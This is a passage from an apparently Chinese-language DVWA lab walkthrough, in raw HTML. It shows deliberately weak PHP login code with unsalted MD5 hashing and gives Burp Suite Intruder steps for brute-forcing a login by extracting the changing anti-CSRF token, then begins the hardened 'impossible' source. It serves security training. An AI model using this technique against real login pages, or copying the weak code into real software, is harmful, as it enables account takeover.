class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>generateSessionToken();</code>  根据注释可以理解：用于生成反 CSRF 令牌</p>\n<p>​\t这段代码放到最后，说明无论登录成功或失败，他都会生成新的 <code>session_token</code></p>\n<p><code> checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );</code></p>\n<p>​\t根据注释可以理解：检查反 CSRF 令牌。</p>\n<p>​\t我们详细分析一下。（这里先不分析 CSRF，就针对暴力破解来分析。）</p>\n<p>​\tSession 意思是会话。当用户访问服务器，就开始了一次会话，这个时候服务器为用户生成一个 session（会话），sessionID 表示这\t个会话的唯一标识。</p>\n<p>​\t <code>$_SESSION[ 'session_token' ]</code>  读取 <code>generateSessionToken()</code>  生成的会话令牌 ( <code>session_token</code> )</p>\n<p>​\t <code>$_REQUEST[ 'user_token' ]</code>  读取请求中的用户令牌（ <code>user_token</code> ）</p>\n<p>​\t我们无法查看 checkToken () 函数的源码，但可以确定是检测 user_token 和 session_token 的，如果这个函数检查不通过用户名和密码正确也登录不了。</p>\n<p><code>generateSessionToken()</code>  生成 session_token 是放在服务端进行的，即使我们反复登录，checkToken () 也能正确的读取 session_token, 因此不是影响暴力破解的因素。</p>\n<p>影响暴力破解的因素就是 user_token，只要每次都能获取正确的 user_token，便可完成暴力破解。</p>\n<p>我们在该页面，右键查看源代码可见 <code>user_token</code> ，在刷新时，这个 <code>user_token</code>  是会发生改变的。</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516114145902.png\" alt=\"image-20240516114145902\" /></p>\n<p>打开 BurpSuite 抓包，输入用户名 admin，密码随便输，点击登录，将抓到的结果发送到 Intruder</p>\n<p>选择 Pitchfork 攻击类型，选取密码和 user_token 作为变量</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516130231157.png\" alt=\"image-20240516130231157\" /></p>\n<p>先点击 Setting 选项卡，找到 Grep-Extract（提取响应消息中的有用信息），点击 Add, 点击 refetch response, 双击 token 值，点 ok</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516133012978.png\" alt=\"image-20240516133012978\" /></p>\n<p>往下翻，Redirections 设置为 Always，这个配置是说攻击时，Burp Suite 怎么处理重定向，配置成总是跟随重定向</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516133753597.png\" alt=\"image-20240516133753597\" /></p>\n<p>再设置 Resource pool，因为 Recursive_Grep 模式不支持多线程攻击。</p>\n<p>老版本的 BurpSuite 是 option 下的 Request Engine。</p>\n<p>将攻击线程设置为 1，请求间隔设置为 2000ms</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516133455132.png\" alt=\"image-20240516133455132\" /></p>\n<p>设置 payload 1，跟前面一样导入密码字典就行</p>\n<p>设置 payload2，注意 payload 类型，填上刚才抓包的 user_token 作为初始 payload，配置完就可以开始攻击了</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516140842169.png\" alt=\"image-20240516140842169\" /></p>\n<p>两种方法确定密码，一是反选，就是把反选登录失败时的字段 Username and/or password incorrect.</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516142843489.png\" alt=\"image-20240516142843489\" /></p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516142927133.png\" alt=\"image-20240516142927133\" /></p>\n<p>二是看响应长度，最长那个就是</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516143004429.png\" alt=\"image-20240516143004429\" /></p>\n<p>到此 high 级暴力破解完成。</p>\n<h3 id=\"impossible级\"><a class=\"anchor\" href=\"#impossible级\">#</a> impossible 级</h3>\n<p>针对暴力破解，GET 提交方式改为 POST 提交方式，也加入了 token 校验，同时限制登录次数，如果登录失败三次账户就会被锁定，需要等待 15 分钟才能尝试。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 检查 token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 用户名输入保护措施，过滤一些特殊字符</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 密码输入保护措施</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">// 默认值，失败次数，锁定时间，账户是否锁定</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$total_failed_login</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$lockout_time</span>       <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$account_locked</span>     <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 获取最近一次登录时间，还有失败登录次数</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\">// 查看用户是否被锁定</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'failed_login'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$total_failed_login</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token comment\">// User locked out.  Note, using this method would allow for user enumeration!</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">//echo \"&lt;pre>&lt;br />This account has been locked due to too many incorrect logins.&lt;/pre>\";</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token comment\">// 计算何时允许用户再次登录</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$last_login</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtotime</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'last_login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$timeout</span>    <span class=\"token operator\">=</span> <span class=\"token variable\">$last_login</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$lockout_time</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$timenow</span>    <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        */</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\">// 检查是否已经过去了足够的时间，如果它没有锁定帐户</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$timenow</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$timeout</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token variable\">$account_locked</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token comment\">// print \"The account is locked&lt;br />\";</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">// 检查数据库（如果用户名与密码匹配）</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':password'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token 